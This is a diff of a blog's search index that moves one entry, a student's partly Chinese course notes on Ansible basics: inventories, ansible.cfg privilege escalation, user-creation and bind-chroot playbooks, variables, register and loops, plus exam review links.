-<h4 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ansible</span>-navigator run -m stdout playbook.yml</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="Ansible-simple-buildup"><a href="#Ansible-simple-buildup" class="headerlink" title="Ansible simple buildup"></a>Ansible simple buildup</h3><h4 id="Ansible-cfg-Inventory"><a href="#Ansible-cfg-Inventory" class="headerlink" title="Ansible.cfg &amp; Inventory"></a>Ansible.cfg &amp; Inventory</h4><ul>
-<li><code>$vim ansible.cfg</code></li>
-</ul>
-<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">inventory = ./inventory</span><br><span class="line">remote_user = devops</span><br><span class="line">ask_pass = false</span><br><span class="line"># $ssh-keygen</span><br><span class="line"># $ssh-<span class="keyword">copy</span>-id</span><br><span class="line">[privilege_escalation]</span><br><span class="line">become = true</span><br><span class="line">become_method = sudo</span><br><span class="line">become_user = root</span><br><span class="line">become_ask_pass = false</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>vim inventory</code></li>
-</ul>
-<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.<span class="keyword">com</span></span><br><span class="line">serverb.lab.example.<span class="keyword">com</span></span><br><span class="line"></span><br><span class="line">[unbound_server]</span><br><span class="line">servverc.lab.example.<span class="keyword">com</span></span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>$ansible-navigator inventory --graph -m stdout</code></li>
-<li><code>$ansible-navigator exec --ansible -m ansible.builtin.user -a &#39;name=rcwang&#39; bind_server</code><ul>
-<li>ansibel.builtin.user -a : bliud user</li>
-<li>bind_server : In bind_server</li>
-</ul>
-</li>
-</ul>
-<h4 id="Playbook"><a href="#Playbook" class="headerlink" title="Playbook"></a>Playbook</h4><ul>
-<li><code>$vim newuser.yml</code></li>
-</ul>
-<div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">useradd</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">jjli</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">jjli</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span>  <span class="comment"># default</span></span><br><span class="line">        </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">hcyang</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">hcyang</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>$vim bind_server.yml</code></li>
-</ul>
-<div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># This file is setup by &lt;name&gt; at &lt;time&gt; for setting up &lt;server&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">bind-chroot</span> <span class="string">server</span> <span class="string">setup</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Step1.</span> <span class="string">Installation</span></span><br><span class="line">      <span class="attr">ansible.builtin.package:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">bind-chroot</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br><span class="line">    </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Step2.</span> <span class="string">First</span> <span class="string">Start</span></span><br><span class="line">      <span class="attr">ansible.builtin.service:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">named-chroot</span></span><br><span class="line">        <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></div>
-
-
-<h4 id="Other-parameter"><a href="#Other-parameter" class="headerlink" title="Other parameter"></a>Other parameter</h4><ul>
-<li>增加輸出的細部資訊<ul>
-<li><code>$ansibel-navigator run newuser.yml -m stdout -vvvv</code></li>
-</ul>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>選項v</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-v</td>
-<td>顯示任務結果。</td>
-</tr>
-<tr>
-<td>-vv</td>
-<td>任務結果和任務配置都會顯示</td>
-</tr>
-<tr>
-<td>-vvv</td>
-<td>包含關於與受管主機連接的資訊</td>
-</tr>
-<tr>
-<td>-vvvv</td>
-<td>增加了連接外掛程式相關的額外詳細程度選項，包括受管主機上用於執行腳本的用戶，以及所執行的腳本</td>
-</tr>
-</tbody></table>
-<ul>
-<li><code>$ansible-navigator run newuser.yml -m stdout --syntax-check</code><ul>
-<li>檢查語法錯誤 or 縮排</li>
-</ul>
-</li>
-</ul>
-<h3 id="Variable-Fact"><a href="#Variable-Fact" class="headerlink" title="Variable &amp; Fact"></a>Variable &amp; Fact</h3><h4 id="Playbook-variable"><a href="#Playbook-variable" class="headerlink" title="Playbook variable"></a>Playbook variable</h4><ul>
-<li><code>$vim newuser.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">useradd</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">vars:</span> </span><br><span class="line">    <span class="attr">user1:</span> <span class="string">chiawei</span></span><br><span class="line">    <span class="attr">uid1:</span> <span class="number">5566</span></span><br><span class="line">  <span class="attr">vars_files:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">userlist.yml</span> <span class="comment">#</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;user1&#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;user1&#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;uid1&#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span>  <span class="comment"># default</span></span><br><span class="line">        </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user2 &#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user2 &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;uid2&#125;&#125;</span>&quot;</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div></li>
-<li><code>$vim userlist.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">user2:</span> <span class="string">fan</span></span><br><span class="line"><span class="attr">uid2:</span> <span class="number">1234</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-<h4 id="Host-group-variable"><a href="#Host-group-variable" class="headerlink" title="Host &amp; group variable"></a>Host &amp; group variable</h4><ul>
-<li><code>vim inventory</code></li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.com ip4.addr=172.25.250.11 # Host variable</span><br><span class="line">serverb.lab.example.com ip4.addr=172.25.250.12</span><br><span class="line"></span><br><span class="line">[bind_server:vars] # group variable</span><br><span class="line">install_sodtware = bind-chroot</span><br><span class="line">service_name = named-chroot</span><br><span class="line"></span><br><span class="line">[unbound_server]</span><br><span class="line">servverc.lab.example.com</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>$mkdir group_vars host_vars</code></li>
-</ul>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$mkdir</span> group_vars </span><br><span class="line"><span class="variable">$mkdir</span> host_vars</span><br><span class="line"><span class="variable">$cd</span> group_vars</span><br><span class="line"><span class="variable">$vim</span> bind_server</span><br><span class="line"><span class="variable">$cd</span> ..</span><br><span class="line"><span class="variable">$cd</span> host_vars</span><br><span class="line"><span class="variable">$vim</span> servera.lab.example.com</span><br><span class="line"><span class="variable">$vim</span> serverb.lab.example.com</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>$vim bind_server</code></li>
-</ul>
-<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">install_software = bind-chroot</span><br><span class="line">service_name = named-chroot</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>$vim servera.lab.example.com</code></li>
-</ul>
-<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">ipv4_addr = 172.25.250.11</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li><code>$vim serverb.lab.example.com</code></li>
-</ul>
-<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">ipv4_addr = 172.25.250.12</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>$tree</code></li>
-</ul>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/HkTGL0wmT.png"
-                      alt="image.png"
-                ></p>
-<h4 id="Register"><a href="#Register" class="headerlink" title="Register"></a>Register</h4><ul>
-<li><p>register 語法可以取得命令輸出，並保存在一個臨時變數中</p>
-</li>
-<li><p><code>$vim newuser.yml</code></p>
-<div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Addusers</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">add</span> <span class="string">different</span> <span class="string">user</span> <span class="string">in</span> <span class="string">different</span> <span class="string">server</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;newuser_name&#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">register:</span> <span class="string">useradd_result</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Print</span> <span class="string">results</span></span><br><span class="line">      <span class="attr">ansible.builtin.debugg:</span></span><br><span class="line">        <span class="attr">var:</span> <span class="string">useradd_result</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p><code>$ansible-navigator run newuser.yml -m stdout</code></p>
-</li>
-</ul>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/S1Eos0wXT.png"
-                      alt="image.png"
-                ></p>
-<h4 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h4><h3 id="Task-control"><a href="#Task-control" class="headerlink" title="Task control"></a>Task control</h3><ul>
-<li><code>$vim user_add.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">User</span> <span class="string">Management</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">serverd.lab.example.com</span></span><br><span class="line">  <span class="attr">vars:</span></span><br><span class="line">    <span class="attr">user_lists:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">hcyang</span> </span><br><span class="line">        <span class="attr">user_id:</span> <span class="number">1236</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">jjli</span> </span><br><span class="line">        <span class="attr">user_id:</span> <span class="number">1235</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> &#123;&#123; <span class="string">item.name</span> &#125;&#125; </span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.name &#125;&#125;</span>&quot;</span> </span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.user_id &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br><span class="line">      <span class="attr">loop:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user_lists &#125;&#125;</span>&quot;</span> </span><br><span class="line">      <span class="attr">register:</span> <span class="string">useradd_result</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">print</span> <span class="string">results</span> </span><br><span class="line">      <span class="attr">ansible.builtin.debug:</span></span><br><span class="line">        <span class="attr">msg:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        An user is add with name &#123;&#123; item.name &#125;&#125; </span></span><br><span class="line"><span class="string"></span>      <span class="attr">loop:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; useradd_result. results &#125;&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-<h2 id="期末考整理"><a href="#期末考整理" class="headerlink" title="期末考整理"></a>期末考整理</h2><p><code>DNS Http varnish database</code></p>
-<p><a class="link"   href="https://www.youtube.com/watch?v=VhXenrYuYcE" >DNS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link"   href="https://www.youtube.com/watch?v=0em4LrNN_v8" >HTTP_server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link"   href="https://www.youtube.com/watch?v=q14Aunuv9WU" >Https cerify ~1:10:00 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link"   href="https://www.youtube.com/watch?v=q14Aunuv9WU" >Varnish and haproxy 1:10:00 ~  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a href="">Database</a></p>
-]]></content>
-      <categories>
-        <category>csie</category>
-      </categories>
-      <tags>
-        <tag>csie</tag>
-        <tag>server</tag>
       </tags>
   </entry>
   <entry>
@@ -1770,6 +1576,210 @@
 ]]></content>
       <tags>
         <tag>rev</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NTTU 伺服器原理 WriteUp-2</title>
+    <url>/2024/08/09/server-1/</url>
+    <content><![CDATA[<h2 id="Ansible"><a href="#Ansible" class="headerlink" title="Ansible"></a>Ansible</h2><h3 id="Docs"><a href="#Docs" class="headerlink" title="Docs"></a>Docs</h3><ul>
+<li><code>$ansible-navigator doc -l</code></li>
+<li><code>ansible-navigator doc &lt;ansible.builtin.dnf&gt;</code></li>
+</ul>
+<p><a class="link"   href="https://docs.ansible.com/" >Official <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/By-XF2wX6.png"
+                      alt="image.png"
+                ></p>
+<h3 id="Yaml"><a href="#Yaml" class="headerlink" title="Yaml"></a>Yaml</h3><p><a href="/4KwXbbiGQd2tMdJVML-zxA">Re</a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/H1MBF2vQT.png"
+                      alt="image.png"
+                ></p>
+<h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><h4 id="名詞解釋"><a href="#名詞解釋" class="headerlink" title="名詞解釋"></a>名詞解釋</h4><ul>
+<li>inventory<ul>
+<li>host</li>
+<li>group</li>
+</ul>
+</li>
+<li>playbook<ul>
+<li>play</li>
+<li>task<ul>
+<li>modules</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Requirement"><a href="#Requirement" class="headerlink" title="Requirement"></a>Requirement</h4><p>Linux , macos ,unix like host: <strong>need &gt;python3.5</strong></p>
+<h4 id="Inventory"><a href="#Inventory" class="headerlink" title="Inventory"></a>Inventory</h4><ul>
+<li>定義清單</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cd</span> /etc/ansible</span><br><span class="line"><span class="variable">$vim</span> hosts</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>INI or YAML</p>
+</blockquote>
+<ul>
+<li>群組</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.com</span><br><span class="line">serverb.lab.example.com</span><br><span class="line">(server count)&gt;=0</span><br><span class="line">[web_server]</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>巢狀群組</li>
+</ul>
+<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[usa]</span><br><span class="line">washington1.example.<span class="keyword">com</span></span><br><span class="line">washington2.example.<span class="keyword">com</span></span><br><span class="line">[canada]</span><br><span class="line">ontario01.example.<span class="keyword">com</span></span><br><span class="line">ontario02.example.<span class="keyword">com</span></span><br><span class="line">[north-americ<span class="variable">a:children</span>]</span><br><span class="line">canada</span><br><span class="line">usa</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="ansible-cfg"><a href="#ansible-cfg" class="headerlink" title="ansible.cfg"></a>ansible.cfg</h4><ul>
+<li><code>$vim ansible.cfg</code></li>
+</ul>
+<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">inventory = ./inventory</span><br><span class="line">remote user = devops</span><br><span class="line">ask_pass = false</span><br><span class="line"># $ssh-keygen</span><br><span class="line"># $ssh-<span class="keyword">copy</span>-id</span><br><span class="line">[privilege_escalation]</span><br><span class="line">become = true</span><br><span class="line">become method = sudo</span><br><span class="line">become_user = root</span><br><span class="line">become_ask_pass = true</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>Show inventory</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cp</span> /etc/ansible/hosts inventory</span><br><span class="line"><span class="variable">$ansible</span>-navigator inventory -m stdout &lt;--list or --graph&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Playbook-yml"><a href="#Playbook-yml" class="headerlink" title="Playbook.yml"></a>Playbook.yml</h4><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Adduser</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">username</span> <span class="string">is</span> <span class="string">chih</span> </span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">chih</span> </span><br><span class="line">        <span class="attr">uid:</span> <span class="number">8888</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ansible</span>-navigator run -m stdout playbook.yml</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Ansible-simple-buildup"><a href="#Ansible-simple-buildup" class="headerlink" title="Ansible simple buildup"></a>Ansible simple buildup</h3><h4 id="Ansible-cfg-Inventory"><a href="#Ansible-cfg-Inventory" class="headerlink" title="Ansible.cfg &amp; Inventory"></a>Ansible.cfg &amp; Inventory</h4><ul>
+<li><code>$vim ansible.cfg</code></li>
+</ul>
+<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">inventory = ./inventory</span><br><span class="line">remote_user = devops</span><br><span class="line">ask_pass = false</span><br><span class="line"># $ssh-keygen</span><br><span class="line"># $ssh-<span class="keyword">copy</span>-id</span><br><span class="line">[privilege_escalation]</span><br><span class="line">become = true</span><br><span class="line">become_method = sudo</span><br><span class="line">become_user = root</span><br><span class="line">become_ask_pass = false</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>vim inventory</code></li>
+</ul>
+<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.<span class="keyword">com</span></span><br><span class="line">serverb.lab.example.<span class="keyword">com</span></span><br><span class="line"></span><br><span class="line">[unbound_server]</span><br><span class="line">servverc.lab.example.<span class="keyword">com</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$ansible-navigator inventory --graph -m stdout</code></li>
+<li><code>$ansible-navigator exec --ansible -m ansible.builtin.user -a &#39;name=rcwang&#39; bind_server</code><ul>
+<li>ansibel.builtin.user -a : bliud user</li>
+<li>bind_server : In bind_server</li>
+</ul>
+</li>
+</ul>
+<h4 id="Playbook"><a href="#Playbook" class="headerlink" title="Playbook"></a>Playbook</h4><ul>
+<li><code>$vim newuser.yml</code></li>
+</ul>
+<div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">useradd</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">jjli</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">jjli</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span>  <span class="comment"># default</span></span><br><span class="line">        </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">hcyang</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">hcyang</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$vim bind_server.yml</code></li>
+</ul>
+<div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># This file is setup by &lt;name&gt; at &lt;time&gt; for setting up &lt;server&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">bind-chroot</span> <span class="string">server</span> <span class="string">setup</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Step1.</span> <span class="string">Installation</span></span><br><span class="line">      <span class="attr">ansible.builtin.package:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">bind-chroot</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br><span class="line">    </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Step2.</span> <span class="string">First</span> <span class="string">Start</span></span><br><span class="line">      <span class="attr">ansible.builtin.service:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">named-chroot</span></span><br><span class="line">        <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></div>
+
+
+<h4 id="Other-parameter"><a href="#Other-parameter" class="headerlink" title="Other parameter"></a>Other parameter</h4><ul>
+<li>增加輸出的細部資訊<ul>
+<li><code>$ansibel-navigator run newuser.yml -m stdout -vvvv</code></li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>選項v</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-v</td>
+<td>顯示任務結果。</td>
+</tr>
+<tr>
+<td>-vv</td>
+<td>任務結果和任務配置都會顯示</td>
+</tr>
+<tr>
+<td>-vvv</td>
+<td>包含關於與受管主機連接的資訊</td>
+</tr>
+<tr>
+<td>-vvvv</td>
+<td>增加了連接外掛程式相關的額外詳細程度選項，包括受管主機上用於執行腳本的用戶，以及所執行的腳本</td>
+</tr>
+</tbody></table>
+<ul>
+<li><code>$ansible-navigator run newuser.yml -m stdout --syntax-check</code><ul>
+<li>檢查語法錯誤 or 縮排</li>
+</ul>
+</li>
+</ul>
+<h3 id="Variable-Fact"><a href="#Variable-Fact" class="headerlink" title="Variable &amp; Fact"></a>Variable &amp; Fact</h3><h4 id="Playbook-variable"><a href="#Playbook-variable" class="headerlink" title="Playbook variable"></a>Playbook variable</h4><ul>
+<li><code>$vim newuser.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">useradd</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">vars:</span> </span><br><span class="line">    <span class="attr">user1:</span> <span class="string">chiawei</span></span><br><span class="line">    <span class="attr">uid1:</span> <span class="number">5566</span></span><br><span class="line">  <span class="attr">vars_files:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">userlist.yml</span> <span class="comment">#</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;user1&#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;user1&#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;uid1&#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span>  <span class="comment"># default</span></span><br><span class="line">        </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user2 &#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user2 &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;uid2&#125;&#125;</span>&quot;</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div></li>
+<li><code>$vim userlist.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">user2:</span> <span class="string">fan</span></span><br><span class="line"><span class="attr">uid2:</span> <span class="number">1234</span></span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<h4 id="Host-group-variable"><a href="#Host-group-variable" class="headerlink" title="Host &amp; group variable"></a>Host &amp; group variable</h4><ul>
+<li><code>vim inventory</code></li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.com ip4.addr=172.25.250.11 # Host variable</span><br><span class="line">serverb.lab.example.com ip4.addr=172.25.250.12</span><br><span class="line"></span><br><span class="line">[bind_server:vars] # group variable</span><br><span class="line">install_sodtware = bind-chroot</span><br><span class="line">service_name = named-chroot</span><br><span class="line"></span><br><span class="line">[unbound_server]</span><br><span class="line">servverc.lab.example.com</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$mkdir group_vars host_vars</code></li>
+</ul>
